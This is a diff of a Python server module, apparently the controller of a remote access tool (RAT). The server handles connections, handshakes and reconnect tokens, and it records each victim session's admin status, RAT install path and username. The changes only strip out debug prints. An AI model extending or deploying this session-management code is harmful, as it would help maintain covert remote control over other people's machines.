@@ -60,9 +60,7 @@ class Handler(threading.Thread):
                 Handler.dict_conn[session] = [session, sock, ip, port, is_he_alive, is_he_admin, path_rat, usename, token, select]
        
                 Handler.number_conn = self.ObjSql.returnLastSession() + 1 #ok
-                #print(Handler.number_conn) ok
-                #print("type of dict_conn ----->",type(Handler.dict_conn[0])) ok
-                #print(Handler.dict_conn)
+
         else:
             #print("[?] NOT Value in database.")
             pass
@@ -109,7 +107,6 @@ class Handler(threading.Thread):
             
             conn,address = self.sock_server.accept()
 
-            
             handshake = HandShake(conn,address,self.ObjSql)
             handshake.start()
             handshake.join()
@@ -209,7 +206,6 @@ The client first sends this information, then the server sends the parameters as
             if(tmp[0]=="MOD_RECONNECT"): #MOD_RECONNECT  | TOKEN fdsafafsdfsadf3454sdfasdf5
 
                 token = tmp[1]
-                print(token)
                 if bool(Handler.dict_conn): 
                     for target in Handler.dict_conn.values():
                         if(target[NB_TOKEN] == token and target[NB_IP] == self.address[0]): #if the token is already in the dictionary it means that the client is trying to reconnect. This information is thus well stored in the db.
@@ -298,16 +294,11 @@ The client first sends this information, then the server sends the parameters as
                 
                 #other information does not change:
                 #The information is retrieved from the database to the dictionary:
-                #print("ADMIN: ")
+
                 Handler.dict_conn[nb_session][NB_ADMIN] = self.ObjSql.returnValue(nb_session,"is_he_admin")
-                #print("PATH")
                 Handler.dict_conn[nb_session][NB_PATH] = self.ObjSql.returnValue(nb_session,"path_RAT")
-                #print("USRNAME: ")
                 Handler.dict_conn[nb_session][NB_USERNAME] = self.ObjSql.returnValue(nb_session,"username")
-                #print("TOKEN: ")
                 Handler.dict_conn[nb_session][NB_TOKEN] = self.ObjSql.returnValue(nb_session,"token")
-                #print("Reco TOKEN:", Handler.dict_conn[nb_session][NB_TOKEN])
-                #print("SELECT")
                 Handler.dict_conn[nb_session][NB_SELECT] = False 
                 
         else:
